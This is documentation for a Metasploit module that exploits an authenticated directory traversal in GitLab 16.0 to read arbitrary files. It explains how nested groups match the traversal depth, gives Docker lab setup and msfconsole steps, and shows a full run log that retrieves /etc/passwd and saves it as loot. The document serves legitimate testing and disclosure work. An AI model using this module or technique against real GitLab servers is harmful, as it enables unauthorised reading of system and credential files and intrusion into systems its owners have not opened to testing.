## Vulnerable Application

GitLab version 16.0 contains a directory traversal for arbitrary file read
as the `gitlab-www` user. This module requires authentication for exploitation.
In order to use this module, a user must be able to create a project and groups.
When exploiting this vulnerability, there is a direct correlation between the traversal
depth, and the depth of groups the vulnerable project is in. The minimum for this seems
to be `5`, but up to `11` have also been observed. An example of this, is if the directory
traversal needs a depth of `11`, a group
and 10 nested child groups, each a sub of the previous, will be created (adding up to `11`).
Visually this looks like:
`Group1->child1->child2->child3->child4->child5->child6->child7->child8->child9->child10`.
If the depth was `5`, a group and 4 nested child groups would be created.
With all these requirements satisfied a dummy file is uploaded, and the full
traversal is then executed. Cleanup is performed by deleting the first group which
cascades to deleting all other objects created.

Tested on a Docker image of GitLab 16.0

### Install

A Docker image is available:

```
sudo docker run --detach \
  --hostname gitlab.example.com \
  --publish 443:443 --publish 80:80 --publish 22:22 \
  --name gitlab \
  --restart always \
  --volume $GITLAB_HOME/config:/etc/gitlab \
  --volume $GITLAB_HOME/logs:/var/log/gitlab \
  --volume $GITLAB_HOME/data:/var/opt/gitlab \
  --shm-size 256m \
gitlab/gitlab-ee:16.0.0-ee.0 
```

To retrieve the default password:

```
sudo docker exec -it gitlab grep 'Password:' /etc/gitlab/initial_root_password
```

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/gitlab_authenticated_subgroups_file_read`
1. Do: `set rhosts [ip]`
1. Do: `set username [username]`
1. DO: `set password [password]`
1. Do: `run`
1. You should be able to read an arbitrary file.

## Options

### DEPTH

Depth for path traversal (also groups creation). 11 seems pretty safe but it may work with less. Defaults to `11`.

### FILE

File to read. Defaults to `/etc/passwd`

## Scenarios

### Docker GitLab 16.0

```
[*] Processing gitlab.rb for ERB directives.
resource (gitlab.rb)> use auxiliary/gather/gitlab_authenticated_subgroups_file_read
resource (gitlab.rb)> set rhosts 127.0.0.1
rhosts => 127.0.0.1
resource (gitlab.rb)> set username root
username => root
resource (gitlab.rb)> set password 9ADJtW5hHcrTYKDZ2yeQduyHyWuGUk7b9ikV/njVVC4=
password => 9ADJtW5hHcrTYKDZ2yeQduyHyWuGUk7b9ikV/njVVC4=
resource (gitlab.rb)> set verbose true
verbose => true
resource (gitlab.rb)> exploit
[*] Running module against 127.0.0.1
[+] CSRF Token: dPAr4PTaCuwRU5-j-snq7FfX1V0qh7MoDguHWbUCXCPnwKK3azJXGaF5QxXjRtXkn2_ORLoEt8-NGf59fngrUg
[*] Creating 11 groups
[*] Creating group: GYS2KiLq
[+] CSRF Token: RiloN6gmbtG6kHO55i7i0LFqaN38Bwd_EZCHW2Q9UcLVGeFgN84zJAq6rw__od3YedJzxGyEA5iSgv5_r0cmsw
[*] Creating child group: YzJEBtNX with parent id: 2
[+] CSRF Token: uSAAt3_f4qbQtpxzkyI-vefpmQhh3vxFtee7I1bmVxUqEIng4De_U2CcQMWKrQG1L1GCEfFd-KI29cIHnZwgZA
[*] Creating child group: kl9AGSEx with parent id: 3
[+] CSRF Token: ujc-Maz6zilT6D5fPjiq-s0CtVg9CYm43f71Eiu35I0pB7dmMxKT3OPC4uknt5XyBbquQa2KjV9e7Iw24M2T_A
[*] Creating child group: 9QC5nfTB with parent id: 4
[+] CSRF Token: mkDq3WQ7BdDAfiO_INXVAZ7UOeNPlHXJqx0_0TfqmgwJcGOK-9NYJXBU_wk5WuoJVmwi-t8XcS4oD0b1_JDtfQ
[*] Creating child group: ssHxNX3y with parent id: 5
[+] CSRF Token: -9mNSwNeTCTQ6EmVxDV4yAq1O7TvVbpvctLZJwO0d4Fo6QQcnLYR0WDClSPdukfAwg0grX_WvojxwKADyM4A8A
[*] Creating child group: w7bktrEs with parent id: 6
[+] CSRF Token: bnozD-CZzDp00QJ9Fx9pVEcwg6QO_1iykxrRUg17NIH9SrpYf3GRz8T73ssOkFZcj4iYvZ58XFUQCKh2xgFD8A
[*] Creating child group: uU8ELnQm with parent id: 7
[+] CSRF Token: l57r09_W7GDI5VXVZ5SS0BOatod1-HCZyZj2z3J_Ac8ErmKEQD6xlXjPiWN-G63Y2yKtnuV7dH5Kio_ruQV2vg
[*] Creating child group: o23bujpZ with parent id: 8
[+] CSRF Token: 81sCdo47UC5diIjdq_uquTFpMwzNDnV-mG9RprW-ACdga4shEdMN2-2iVGuydJWx-dEoFV2NcZkbfSiCfsR3Vg
[*] Creating child group: A3ksDjIZ with parent id: 9
[+] CSRF Token: SQAMHEjnus9-5Qk-leIXDxLUTDfpD6tfP5fTqgTodezaMIVL1w_nOs7P1YiMbSgH2mxXLnmMr7i8haqOz5ICnQ
[*] Creating child group: fefAYofd with parent id: 10
[+] CSRF Token: wAeXzAb4bFXWLnys1qQ1HCgXtwPplB9ACCdTliQbWTpTNx6bmRAxoGYEoBrPKwoU4K-sGnkXG6eLNSqy72EuSw
[*] Creating child group: d9ojqIJp with parent id: 11
[+] CSRF Token: Jmtw9u0oBZ-TbViSBqgoNaj5NI5hxeIhKb9SWtR-TL-1W_mhcsBYaiNHhCQfJxc9YEEvl_FG5saqrSt-HwQ7zg
[*] Creating project WELLohsl
[*] Creating a dummy file in project
[*] Executing dir traversal
[+] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh

[+] /etc/passwd saved to /root/.msf4/loot/20230602160435_default_127.0.0.1_GitLabfile_635783.txt
[*] Deleting group GYS2KiLq
[*] Auxiliary module execution completed
```
